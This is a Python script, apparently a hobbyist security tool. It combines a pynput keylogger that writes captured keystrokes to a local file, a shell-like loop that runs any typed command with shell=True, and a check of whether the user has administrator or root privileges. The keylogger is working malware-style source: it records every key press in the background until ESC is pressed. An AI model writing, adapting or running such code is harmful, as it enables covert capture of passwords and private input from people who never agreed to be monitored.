    
import os 
import socket 
import getpass
import sys 
import subprocess 
import pynput
from pynput.keyboard import Key, Listener
import concurrent.futures


count = 0
keys = []


def listen():
    def on_press(key):
        global keys, count
        keys.append(key)
        count +=1
        
        if count >= 10:
            count = 0
            write_file(keys)
            keys  = []

    def write_file(keys):
        with open('logkey1.txt', 'a') as f:
            for key in keys:
                f.write(str(key))
                

    def on_release(key):
        if key == Key.esc:
            return False
        
    with Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()


def platform_deff():
    user_n = getpass.getuser()
    host_n = socket.gethostname()
    cur_dir = os.getcwd()
    user_platform = sys.platform
    
    if 'win' in user_platform:
        prompt_line = f'{os.getcwd()}>'
    else:
        prompt_line = (f'{user_n}@{host_n}:{cur_dir}$')
        
        if os.geteuid() == 0:
             prompt_line = (f'{user_n}@{host_n}{cur_dir}#')
             
             
    return prompt_line

    
def terminal_run(prompt_line):

    r_cmd = input(f'{prompt_line} ')
    
    
    if 'cd' in r_cmd:
        try:
            os.chdir(r_cmd[3::])
        except FileNotFoundError as e:
            print(e)
        return

    elif 'exit' in r_cmd:
        print('\nThank you, good bye\n')
        return 'exit'
    
    cmd_out = subprocess.run(r_cmd, shell=True, capture_output=True)
    if cmd_out.stdout.decode("utf-8"):
        print(cmd_out.stdout.decode("utf-8").strip("\n"))  
    else:
         print(cmd_out.stderr.decode("utf-8").strip('\n'))
         
def get_user_priv():
    system_platform = sys.platform
    if "win" in system_platform:
        try:
            temp = os.listdir(os.sep.join([os.environ.get('SystemRoot','C:\\windows'),'temp']))
            print('\nYou are running on WINDOWS on HIGH permmisions\n')
        except PermissionError:
            print('\nYou are running on WINDOWS with LOW permmisions\n')
    else:
        if os.getuid() == 0:
            print('\nYou are running on linux SUDO permmisions\n')  
        else:
            print('\nYou are running on linux LOW permmisions\n')
                  
         
def main():
    executor = concurrent.futures.ProcessPoolExecutor()
    ans = input('Activate KeyLogger? "y" for on: ')
    if ans == 'y':
        print('\nKeyLog is on, press ESC to turn it off ')
        executor.submit(listen)
    
    get_user_priv()
    while True:
        prompt_line = platform_deff()
        stats = terminal_run(prompt_line)
        if stats == 'exit':
            break
            
try:
    main()

except KeyboardInterrupt:
    print('\n\nbye..\n ')
    